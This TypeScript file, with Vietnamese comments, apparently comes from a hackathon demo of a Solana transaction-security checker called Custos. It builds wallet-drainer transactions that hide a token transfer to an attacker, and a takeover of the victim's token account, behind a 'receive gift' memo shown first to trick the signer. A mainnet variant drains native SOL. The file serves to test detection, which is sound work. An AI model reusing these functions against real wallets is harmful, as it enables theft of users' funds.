import {
  Keypair, PublicKey, SystemProgram, TransactionInstruction,
  TransactionMessage, VersionedTransaction,
} from "@solana/web3.js";
import {
  TOKEN_PROGRAM_ID, createTransferInstruction, createSetAuthorityInstruction,
  AuthorityType, getAssociatedTokenAddressSync,
} from "@solana/spl-token";

/** Chương trình SPL Memo — dùng làm lệnh mà Custos CỐ Ý không decode được. */
export const MEMO_PROGRAM = new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr");

export type ThamSoTanCong = {
  nanNhan: PublicKey;
  keTanCong: PublicKey;
  mint: PublicKey;
  soLuong: bigint;
  blockhash: string;
  /** Tài khoản token nguồn/đích. Vắng thì suy ra ATA.
   *  Cần tham số này để DỰNG LẠI hiện trường: sau khi SetAuthority chạy,
   *  ATA đã đổi chủ nên không dùng lại được — phải tạo tài khoản mới. */
  taiKhoanNguon?: PublicKey;
  taiKhoanDich?: PublicKey;
};

/**
 * Dựng giao dịch tấn công cho demo.
 *
 * TRUNG THỰC LÀ RÀNG BUỘC, KHÔNG PHẢI TUỲ CHỌN (CUSTOS.md quyết định 7):
 *
 *   `SetAuthority` MỘT MÌNH chỉ lấy quyền kiểm soát, KHÔNG rút tiền.
 *   Nếu bảng chênh lệch hiển thị 500 → 0 thì giao dịch phải THẬT SỰ chứa
 *   `Transfer`. Vì vậy hàm này luôn dựng cả hai lệnh, không bao giờ chỉ một.
 *
 * Thể lệ BTC: demo dàn dựng sai sự thật bị trừ điểm hoặc loại.
 */
export function dungGiaoDichTanCong(p: ThamSoTanCong): VersionedTransaction {
  const ataNanNhan = p.taiKhoanNguon ?? getAssociatedTokenAddressSync(p.mint, p.nanNhan);
  const ataKeTanCong = p.taiKhoanDich ?? getAssociatedTokenAddressSync(p.mint, p.keTanCong);

  const lenh: TransactionInstruction[] = [];

  // Lệnh "vô hại" đứng trước — người dùng đọc lệnh đầu rồi bấm ký.
  lenh.push(
    new TransactionInstruction({
      keys: [],
      programId: MEMO_PROGRAM,
      data: Buffer.from("nhan qua tang", "utf8"),
    }),
  );

  // 1. Chuyển tiền thật.
  lenh.push(
    createTransferInstruction(ataNanNhan, ataKeTanCong, p.nanNhan, p.soLuong, [], TOKEN_PROGRAM_ID),
  );

  // 2. Đổi chủ tài khoản token — nạn nhân mất luôn khả năng lấy lại.
  lenh.push(
    createSetAuthorityInstruction(
      ataNanNhan, p.nanNhan, AuthorityType.AccountOwner, p.keTanCong, [], TOKEN_PROGRAM_ID,
    ),
  );

  // Chương trình chưa xác minh trong giao dịch này chính là SPL Memo ở lệnh đầu.
  // Bản trước gọi thêm Vote Program với dữ liệu rác để "tạo" một lệnh không
  // decode được — nhưng Vote là chương trình CÓ THẬT, nó từ chối và làm hỏng cả
  // giao dịch trên devnet. Memo vừa luôn thành công, vừa thật sự không decode
  // được, nên coverage khuyết một cách trung thực mà không cần dựng lệnh giả.

  return new VersionedTransaction(
    new TransactionMessage({
      payerKey: p.nanNhan,
      recentBlockhash: p.blockhash,
      instructions: lenh,
    }).compileToV0Message(),
  );
}

/** Giao dịch lành tính tương ứng — dùng làm ca âm tính khi đo báo nhầm. */
export function dungGiaoDichLanhTinh(p: Omit<ThamSoTanCong, "keTanCong"> & { banBe: PublicKey }): VersionedTransaction {
  const ataToi = p.taiKhoanNguon ?? getAssociatedTokenAddressSync(p.mint, p.nanNhan);
  const ataBan = p.taiKhoanDich ?? getAssociatedTokenAddressSync(p.mint, p.banBe);
  return new VersionedTransaction(
    new TransactionMessage({
      payerKey: p.nanNhan,
      recentBlockhash: p.blockhash,
      instructions: [
        createTransferInstruction(ataToi, ataBan, p.nanNhan, p.soLuong, [], TOKEN_PROGRAM_ID),
      ],
    }).compileToV0Message(),
  );
}

export type ThamSoTanCongSol = {
  nanNhan: PublicKey;
  keTanCong: PublicKey;
  /** Số lamport rút đi. */
  soLamport: bigint;
  blockhash: string;
};

/**
 * Bản MAINNET của giao dịch tấn công: rút SOL thật.
 *
 * VÌ SAO RIÊNG MỘT HÀM. Bản token ở trên cần một mint — trên devnet đội tự mint
 * USDC-demo. Mainnet không mint token giả được, nên bản thật rút SOL native. Custos
 * bắt bằng luật 13 (SOL rời ví), không phải luật token.
 *
 * TRUNG THỰC (quyết định 7): hàm chỉ chứa đúng một Memo "vô hại" và một
 * SystemProgram.transfer. Bảng chênh lệch sẽ hiện SOL rời ví đúng bằng số thật
 * chuyển đi — không thêm SetAuthority (SOL native không có tài khoản để đoạt quyền).
 *
 * Memo đứng trước làm lệnh Custos cố ý không decode được, để coverage khuyết một
 * cách trung thực — y như bản token.
 */
export function dungGiaoDichTanCongSol(p: ThamSoTanCongSol): VersionedTransaction {
  const lenh: TransactionInstruction[] = [
    new TransactionInstruction({
      keys: [],
      programId: MEMO_PROGRAM,
      data: Buffer.from("nhan qua tang", "utf8"),
    }),
    SystemProgram.transfer({
      fromPubkey: p.nanNhan,
      toPubkey: p.keTanCong,
      lamports: p.soLamport,
    }),
  ];
  return new VersionedTransaction(
    new TransactionMessage({
      payerKey: p.nanNhan,
      recentBlockhash: p.blockhash,
      instructions: lenh,
    }).compileToV0Message(),
  );
}

export { Keypair, SystemProgram };
